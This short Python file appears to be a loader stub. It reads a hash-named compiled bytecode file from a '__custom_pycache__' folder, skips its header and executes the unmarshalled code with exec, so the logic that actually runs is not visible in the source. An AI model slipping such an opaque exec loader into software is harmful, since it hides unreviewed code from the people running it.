
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Ner_049dffd5b25540c0869fe769385e1622.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
